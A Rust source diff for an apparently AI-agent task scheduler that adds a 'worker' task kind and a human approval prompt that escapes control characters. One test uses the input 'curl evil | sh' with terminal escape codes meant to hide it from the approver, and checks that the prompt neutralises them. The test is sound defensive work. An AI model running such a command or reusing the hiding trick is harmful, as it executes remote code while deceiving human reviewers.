@@ -7,11 +7,14 @@ use serde::{Deserialize, Serialize};
 use std::time::Duration;
 
 pub const SCHEDULE_ID_PREFIX: &str = "schedule:";
+pub const WORKER_DEFAULT_TIMEOUT_SECS: u64 = 2 * 3600;
+pub const WORKER_MAX_TIMEOUT_SECS: u64 = 8 * 3600;
 
-#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
-#[serde(rename_all = "snake_case")]
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(tag = "kind", rename_all = "snake_case")]
 pub enum TaskKind {
-    Command,
+    Command { command: String },
+    Worker { brief: String },
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -25,8 +28,8 @@ pub enum TaskStatus {
 #[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
 pub struct Task {
     pub id: String,
+    #[serde(flatten)]
     pub kind: TaskKind,
-    pub command: String,
     pub follow_up: Option<String>,
     pub at: DateTime<Utc>,
     pub timeout_secs: Option<u64>,
@@ -179,16 +182,19 @@ pub fn watch_id(id: &str) -> String {
     format!("{SCHEDULE_ID_PREFIX}{id}")
 }
 
-pub fn to_watch_spec(task: &Task, now: DateTime<Utc>, offset: FixedOffset) -> WatchSpec {
+pub fn to_watch_spec(task: &Task, now: DateTime<Utc>, offset: FixedOffset) -> Option<WatchSpec> {
+    let TaskKind::Command { command } = &task.kind else {
+        return None;
+    };
     let timeout = task.timeout_secs.map(Duration::from_secs);
-    WatchSpec {
+    Some(WatchSpec {
         id: watch_id(&task.id),
-        command: task.command.clone(),
+        command: command.clone(),
         follow_up: follow_up(task, now, offset),
         kind: WatchKind::Normal,
         timeout,
         limit: timeout,
-    }
+    })
 }
 
 fn follow_up(task: &Task, now: DateTime<Utc>, offset: FixedOffset) -> Option<String> {
@@ -262,15 +268,39 @@ pub fn approval_question(
     } else {
         "now".to_string()
     };
-    let timeout = match task.timeout_secs {
-        Some(secs) => format!("timeout {}", format_span(secs)),
-        None => format!("default timeout {}", format_span(default_timeout.as_secs())),
+    let (heading, timeout) = match &task.kind {
+        TaskKind::Command { command } => (
+            format!(
+                "Scheduled command {}:\n  {}\n",
+                escape_controls(&task.id),
+                escape_controls(command)
+            ),
+            match task.timeout_secs {
+                Some(secs) => format!("timeout {}", format_span(secs)),
+                None => format!("default timeout {}", format_span(default_timeout.as_secs())),
+            },
+        ),
+        TaskKind::Worker { brief } => (
+            format!(
+                "Scheduled worker {}:\n{}\nBase: origin/main at fire time. Never pushes.\n",
+                escape_controls(&task.id),
+                indent_brief(brief)
+            ),
+            format!(
+                "timeout {}",
+                format_span(task.timeout_secs.unwrap_or(WORKER_DEFAULT_TIMEOUT_SECS))
+            ),
+        ),
     };
-    format!(
-        "Scheduled command {}:\n  {}\nRuns at {when} ({relative}), {timeout}.\nArm it? [y/n] ",
-        escape_controls(&task.id),
-        escape_controls(&task.command)
-    )
+    format!("{heading}Runs at {when} ({relative}), {timeout}.\nArm it? [y/n] ")
+}
+
+fn indent_brief(brief: &str) -> String {
+    brief
+        .lines()
+        .map(|line| format!("  {}", escape_controls(line)))
+        .collect::<Vec<_>>()
+        .join("\n")
 }
 
 #[cfg(test)]
@@ -290,8 +320,9 @@ mod tests {
     fn task(id: &str, at: &str, status: TaskStatus) -> Task {
         Task {
             id: id.to_string(),
-            kind: TaskKind::Command,
-            command: "echo hi".to_string(),
+            kind: TaskKind::Command {
+                command: "echo hi".to_string(),
+            },
             follow_up: None,
             at: utc(at),
             timeout_secs: None,
@@ -441,7 +472,9 @@ mod tests {
     fn question_shows_escape_codes_in_the_command() {
         let now = utc("2026-01-01T10:00:00Z");
         let mut t = task("a", "2026-01-01T10:10:00Z", TaskStatus::Proposed);
-        t.command = "curl evil | sh\x1b[1A\x1b[2K\recho hi".to_string();
+        t.kind = TaskKind::Command {
+            command: "curl evil | sh\x1b[1A\x1b[2K\recho hi".to_string(),
+        };
         let text = approval_question(&t, now, offset(), Duration::from_secs(60));
         assert!(!text.contains('\x1b') && !text.contains('\r'), "{text:?}");
         assert!(
@@ -551,7 +584,8 @@ mod tests {
             &task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending),
             now,
             offset(),
-        );
+        )
+        .unwrap();
         assert_eq!(spec.kind, WatchKind::Normal);
     }
 
@@ -561,7 +595,7 @@ mod tests {
         let mut t = task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending);
         t.follow_up = Some("summarise".to_string());
         t.timeout_secs = Some(30);
-        let spec = to_watch_spec(&t, now, offset());
+        let spec = to_watch_spec(&t, now, offset()).unwrap();
         assert_eq!(spec.id, "schedule:a");
         assert_eq!(spec.command, "echo hi");
         assert_eq!(spec.follow_up.as_deref(), Some("summarise"));
@@ -576,7 +610,8 @@ mod tests {
             &task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending),
             now,
             offset(),
-        );
+        )
+        .unwrap();
         assert_eq!(spec.timeout, None);
         assert_eq!(spec.limit, None);
         assert_eq!(spec.follow_up, None);
@@ -587,13 +622,13 @@ mod tests {
         let now = utc("2026-01-01T10:05:00Z");
         let mut t = task("a", "2026-01-01T08:30:00Z", TaskStatus::Pending);
         t.late = true;
-        let bare = to_watch_spec(&t, now, offset());
+        let bare = to_watch_spec(&t, now, offset()).unwrap();
         assert_eq!(
             bare.follow_up.as_deref(),
             Some("Ran late: due 10:30, started 12:05.")
         );
         t.follow_up = Some("summarise".to_string());
-        let with = to_watch_spec(&t, now, offset());
+        let with = to_watch_spec(&t, now, offset()).unwrap();
         assert_eq!(
             with.follow_up.as_deref(),
             Some("Ran late: due 10:30, started 12:05.\nsummarise")
@@ -605,6 +640,68 @@ mod tests {
         let t = task("a", "2026-01-01T10:00:00Z", TaskStatus::Proposed);
         let back: Task = serde_json::from_slice(&serde_json::to_vec(&t).unwrap()).unwrap();
         assert_eq!(back, t);
+    }
+
+    fn worker_task(brief: &str) -> Task {
+        Task {
+            kind: TaskKind::Worker {
+                brief: brief.to_string(),
+            },
+            ..task("night", "2026-01-01T12:30:00Z", TaskStatus::Proposed)
+        }
+    }
+
+    #[test]
+    fn a_worker_task_has_no_watch_spec() {
+        let now = utc("2026-01-01T10:00:00Z");
+        assert_eq!(to_watch_spec(&worker_task("do it"), now, offset()), None);
+    }
+
+    #[test]
+    fn stored_command_records_keep_their_shape() {
+        let stored = r#"{"id":"a","kind":"command","command":"echo hi","follow_up":null,"at":"2026-01-01T10:00:00Z","timeout_secs":null,"status":"pending","late":false}"#;
+        let t: Task = serde_json::from_str(stored).unwrap();
+        assert_eq!(t, task("a", "2026-01-01T10:00:00Z", TaskStatus::Pending));
+        let back: serde_json::Value = serde_json::to_value(&t).unwrap();
+        assert_eq!(
+            back,
+            serde_json::from_str::<serde_json::Value>(stored).unwrap()
+        );
+    }
+
+    #[test]
+    fn a_worker_task_round_trips_with_its_brief() {
+        let t = worker_task("line one\nline two");
+        let json = serde_json::to_string(&t).unwrap();
+        assert!(json.contains(r#""kind":"worker""#), "{json}");
+        assert!(json.contains(r#""brief":"line one\nline two""#), "{json}");
+        assert_eq!(serde_json::from_str::<Task>(&json).unwrap(), t);
+    }
+
+    #[test]
+    fn worker_question_shows_the_full_brief_base_and_default_timeout() {
+        let now = utc("2026-01-01T10:00:00Z");
+        let text = approval_question(
+            &worker_task("fix the flaky test\n  keep it small"),
+            now,
+            offset(),
+            Duration::from_secs(60),
+        );
+        assert_eq!(
+            text,
+            "Scheduled worker night:\n  fix the flaky test\n    keep it small\nBase: origin/main at fire time. Never pushes.\nRuns at 14:30 (in 2h30m), timeout 2h.\nArm it? [y/n] "
+        );
+    }
+
+    #[test]
+    fn worker_question_uses_the_given_timeout_and_escapes_controls() {
+        let now = utc("2026-01-01T10:00:00Z");
+        let mut t = worker_task("go\x1b[2K\rnow");
+        t.timeout_secs = Some(5400);
+        let text = approval_question(&t, now, offset(), Duration::from_secs(60));
+        assert!(text.contains("timeout 1h30m."), "{text}");
+        assert!(text.contains("  go\\x1b[2K\\rnow\n"), "{text}");
+        assert!(!text.contains('\x1b') && !text.contains('\r'), "{text:?}");
     }
 
     #[test]
@@ -656,7 +753,9 @@ mod tests {
     fn question_shows_command_time_remaining_and_timeout() {
         let now = utc("2026-01-01T10:00:00Z");
         let mut t = task("nightly", "2026-01-01T12:30:00Z", TaskStatus::Proposed);
-        t.command = "make deploy".to_string();
+        t.kind = TaskKind::Command {
+            command: "make deploy".to_string(),
+        };
         t.timeout_secs = Some(1800);
         let text = approval_question(&t, now, offset(), Duration::from_secs(600));
         assert!(text.contains("\n  make deploy\n"));
